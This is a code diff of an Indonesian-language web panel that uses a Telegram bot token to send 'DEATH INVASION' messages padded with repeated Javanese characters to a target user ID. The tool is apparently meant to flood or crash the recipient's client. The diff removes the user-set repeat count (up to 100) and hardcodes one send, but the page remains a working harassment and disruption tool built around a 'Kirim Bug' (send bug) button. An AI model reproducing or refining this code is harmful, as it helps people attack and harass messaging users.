@@ -41,7 +41,6 @@
     <h2>💥 Sender Aktif</h2>
     <div id="target-section">
       <input type="text" id="target-id" placeholder="ID Telegram Target"><br>
-      <input type="number" id="repeat-count" placeholder="Jumlah Repeat" min="1" max="100"><br>
       <button onclick="sendBug()">🚀 Kirim Bug</button>
     </div>
   </div>
@@ -62,6 +61,7 @@
 
         BOT_TOKEN = entry.token;
 
+        // Tampilkan UI setelah login
         document.getElementById('login').style.display = "none";
         document.getElementById('main').style.display = "block";
         document.getElementById('target-section').style.display = "block";
@@ -73,15 +73,12 @@
 
     async function sendBug() {
       const id = document.getElementById('target-id').value.trim();
-      const repeat = parseInt(document.getElementById('repeat-count').value);
-
       if (!id) return alert("Isi ID dulu 😹");
-      if (!repeat || repeat <= 0 || repeat > 100) return alert("Jumlah repeat tidak valid (1–100)");
 
-      for (let i = 1; i <= repeat; i++) {
+      for (let i = 1; i <= 1; i++) {
         const payload = {
           chat_id: id,
-          text: `💣 *DEATH INVASION [${i}/${repeat}]* 💣\n` + "ꦾ".repeat(4),
+          text: `💣 *DEATH INVASION [${i}/10]* 💣\n` + "ꦾ".repeat(1),
           parse_mode: "Markdown"
         };
 
@@ -91,15 +88,14 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
           });
-
           console.log(`✅ Pesan ${i} terkirim`);
-          await new Promise(res => setTimeout(res, 600)); // delay antar pesan
+          await new Promise(res => setTimeout(res, 500));
         } catch (err) {
           console.error(`❌ Gagal kirim ${i}:`, err);
         }
       }
 
-      alert(`✅ Semua ${repeat} bug berhasil dikirim ke ID: ${id}`);
+      alert("✅ Semua bug berhasil dikirim!");
     }
   </script>
 
